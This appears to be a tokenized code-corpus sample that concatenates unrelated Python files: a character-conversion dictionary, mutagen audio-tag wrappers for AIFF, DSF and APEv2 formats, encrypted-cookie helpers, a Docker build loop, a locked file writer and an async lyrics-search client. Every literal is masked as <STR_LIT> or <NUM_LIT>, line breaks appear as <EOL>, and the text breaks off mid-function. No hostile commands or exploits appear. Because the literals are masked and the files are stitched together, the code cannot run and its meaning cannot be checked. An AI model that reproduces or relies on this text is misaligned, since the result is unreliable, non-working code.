"<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> def t2s ( text : str ) -> str : <EOL> result_chars = [ ] <EOL> for character in text : <EOL> ch_convert = ts_dic . get ( character , character ) <EOL> result_chars . append ( ch_convert ) <EOL> return '<STR_LIT>' . join ( result_chars ) <EOL> if __name__ == "<STR_LIT>" : <EOL> print ( t2s ( "<STR_LIT>" ) ) <EOL> </s>
<s> import mutagen . aiff <EOL> from . file import TAG_MAP_ENTRY <EOL> from . id3 import Id3File <EOL> class AiffFile ( Id3File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . aiff . AIFF <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> super ( AiffFile , self ) . __init__ ( filename , ** kwargs ) <EOL> self . tag_map = self . tag_map . copy ( ) <EOL> self . tag_map . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = int ) , <EOL> } ) <EOL> </s>
<s> import mutagen . dsf <EOL> from . file import TAG_MAP_ENTRY <EOL> from . id3 import Id3File <EOL> class DsfFile ( Id3File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . dsf . DSF <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> super ( DsfFile , self ) . __init__ ( filename , ** kwargs ) <EOL> self . tag_map = self . tag_map . copy ( ) <EOL> self . tag_map . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> } ) <EOL> </s>
<s> import random <EOL> import string <EOL> import time <EOL> import json <EOL> from . crypto import crypto <EOL> def generate_cookie_string ( length = <NUM_LIT> ) : <EOL> characters = string . ascii_letters + string . digits <EOL> return '<STR_LIT>' . join ( random . choice ( characters ) for _ in range ( length ) ) <EOL> def set_cookie ( key : str ) -> str : <EOL> now = time . time ( ) <EOL> plain_text = json . dumps ( { '<STR_LIT>' : key , '<STR_LIT>' : now + <NUM_LIT> } ) <EOL> return crypto . encrypt ( plain_text ) <EOL> def cookie_key ( cookie_string : str ) -> str : <EOL> current_time = int ( time . time ( ) ) <EOL> plain_text = crypto . decrypt ( cookie_string ) <EOL> try : <EOL> data = json . loads ( plain_text ) <EOL> except json . JSONDecodeError : <EOL> return '<STR_LIT>' <EOL> if current_time > data . get ( '<STR_LIT>' , <NUM_LIT> ) : <EOL> return '<STR_LIT>' <EOL> return data . get ( '<STR_LIT>' ) <EOL> </s>
<s> import os <EOL> import subprocess <EOL> platforms = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> base_image = '<STR_LIT>' <EOL> root_dir = os . path . dirname ( os . path . abspath ( __file__ ) ) <EOL> container_root_dir = '<STR_LIT>' <EOL> command_in_docker = "<STR_LIT>" <EOL> for platform in platforms : <EOL> command = f"<STR_LIT>" <EOL> subprocess . run ( command , shell = True ) <EOL> </s>
<s> import threading <EOL> lock = threading . Lock ( ) <EOL> def write ( message ) : <EOL> lock . acquire ( ) <EOL> try : <EOL> with open ( "<STR_LIT>" , "<STR_LIT>" ) as file : <EOL> file . write ( message + "<STR_LIT>" ) <EOL> finally : <EOL> lock . release ( ) <EOL> </s>
<s> import json <EOL> import aiohttp <EOL> import asyncio <EOL> import base64 <EOL> import random <EOL> import string <EOL> import time <EOL> from mod import textcompare <EOL> from mod import tools <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' <EOL> '<STR_LIT>' <EOL> '<STR_LIT>' , } <EOL> async def get_cover ( session , m_hash , m_id ) : <EOL> def _dfid ( num ) : <EOL> random_str = '<STR_LIT>' . join ( random . sample ( ( string . ascii_letters + string . digits ) , num ) ) <EOL> return random_str <EOL> def _mid ( num ) : <EOL> random_str = '<STR_LIT>' . join ( random . sample ( ( string . ascii_letters [ : <NUM_LIT> ] + string . digits ) , num ) ) <EOL> return random_str <EOL> music_url = '<STR_LIT>' <EOL> parameter = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m_hash , <EOL> '<STR_LIT>' : _dfid ( <NUM_LIT> ) , <EOL> '<STR_LIT>' : _mid ( <NUM_LIT> ) , <EOL> '<STR_LIT>' : m_id , <EOL> '<STR_LIT>' : str ( round ( time . time ( ) * <NUM_LIT> ) ) <EOL> } <EOL> json_data_r = await session . get ( music_url , headers = headers , params = parameter ) <EOL> json_data = json . loads ( await json_data_r . text ( ) ) <EOL> if json_data . get ( "<STR_LIT>" ) : <EOL> return json_data [ '<STR_LIT>' ] . get ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> async def a_search ( title = '<STR_LIT>' , artist = '<STR_LIT>' , album = '<STR_LIT>' ) : <EOL> if not any ( ( title , artist , album ) ) : <EOL> return None <EOL> result_list = [ ] <EOL> limit = <NUM_LIT> <EOL> async with aiohttp . ClientSession ( ) as session : <EOL> async with session . get ( <EOL> f"<STR_LIT>" , <EOL> headers = headers ) as response : <EOL> if response . status == <NUM_LIT> : <EOL> song_info_t = await response . text ( ) <EOL> song_info = json . loads ( song_info_t ) <EOL> song_info = song_info [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> if len ( song_info ) >= <NUM_LIT> : <EOL> for song_item in song_info : <EOL> song_name = song_item [ "<STR_LIT>" ] <EOL> singer_name = song_item . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> song_hash = song_item [ "<STR_LIT>" ] <EOL> album_id = song_item [ "<STR_LIT>" ] <EOL> album_name = song_item . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> title_conform_ratio = textcompare . association ( title , song_name ) <EOL> artist_conform_ratio = textcompare . assoc_artists ( artist , singer_name ) <EOL> ratio = ( title_conform_ratio * ( artist_conform_ratio + <NUM_LIT> ) / <NUM_LIT> ) ** <NUM_LIT> <EOL> if ratio >= <NUM_LIT> : <EOL> async with session . get ( <EOL> f"<STR_LIT>" , <EOL> headers = headers ) as response2 : <EOL> lyrics_info = await response2 . json ( ) <EOL> lyrics_id = lyrics_info [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> lyrics_key = lyrics_info [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> async with session . get ( <EOL> f"<STR_LIT>" , <EOL> headers = headers ) as response3 : <EOL> lyrics_data = await response3 . json ( ) <EOL> lyrics_encode = lyrics_data [ "<STR_LIT>" ] <EOL> lrc_text = tools . standard_lrc ( base64 . b64decode ( lyrics_encode ) . decode ( '<STR_LIT>' ) ) <EOL> music_json_data = { <EOL> "<STR_LIT>" : song_name , <EOL> "<STR_LIT>" : album_name , <EOL> "<STR_LIT>" : singer_name , <EOL> "<STR_LIT>" : lrc_text , <EOL> "<STR_LIT>" : await get_cover ( session , song_hash , album_id ) , <EOL> "<STR_LIT>" : tools . calculate_md5 ( <EOL> f"<STR_LIT>" ) <EOL> } <EOL> result_list . append ( { <EOL> "<STR_LIT>" : music_json_data , <EOL> "<STR_LIT>" : ratio <EOL> } ) <EOL> if len ( result_list ) > limit : <EOL> break <EOL> else : <EOL> return None <EOL> sort_li = sorted ( result_list , key = lambda x : x [ '<STR_LIT>' ] , reverse = True ) <EOL> return [ i . get ( '<STR_LIT>' ) for i in sort_li ] <EOL> def search ( title = '<STR_LIT>' , artist = '<STR_LIT>' , album = '<STR_LIT>' ) : <EOL> return asyncio . run ( a_search ( title = title , artist = artist , album = album ) ) <EOL> if __name__ == "<STR_LIT>" : <EOL> print ( search ( album = "<STR_LIT>" ) ) <EOL> </s>
<s> import base64 <EOL> import mutagen . apev2 <EOL> import mutagen . wavpack <EOL> import mutagen . musepack <EOL> import mutagen . monkeysaudio <EOL> import mutagen . optimfrog <EOL> from mutagen . id3 import PictureType <EOL> from . import util <EOL> from . file import Artwork , AudioFile , MetadataItem , TAG_MAP_ENTRY <EOL> pic_type2tag = { <EOL> PictureType . COVER_FRONT : '<STR_LIT>' , <EOL> PictureType . COVER_BACK : '<STR_LIT>' , <EOL> } <EOL> pic_tag2type = { } <EOL> for key , val in pic_type2tag . items ( ) : <EOL> pic_tag2type [ val ] = key <EOL> del key , val <EOL> def get_tracknum ( afile , norm_key ) : <EOL> return util . get_easy_tracknum ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_tracknum ( afile , norm_key , val ) : <EOL> return util . set_easy_tracknum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaltracks ( afile , norm_key ) : <EOL> return util . get_easy_totaltracks ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaltracks ( afile , norm_key , val ) : <EOL> return util . set_easy_totaltracks ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_discnum ( afile , norm_key ) : <EOL> return util . get_easy_discnum ( afile 